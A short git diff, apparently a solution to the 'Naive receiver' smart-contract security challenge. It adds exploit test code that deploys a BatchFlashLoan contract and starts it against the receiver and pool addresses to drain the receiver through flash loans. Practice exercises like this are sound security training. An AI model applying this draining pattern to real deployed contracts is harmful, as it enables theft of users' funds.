@@ -30,7 +30,10 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */
+        const BatchFlashFactory = await ethers.getContractFactory('BatchFlashLoan', deployer);
+        this.batch = await BatchFlashFactory.deploy();
+        await this.batch.start(this.receiver.address, this.pool.address);
     });
 
     after(async function () {
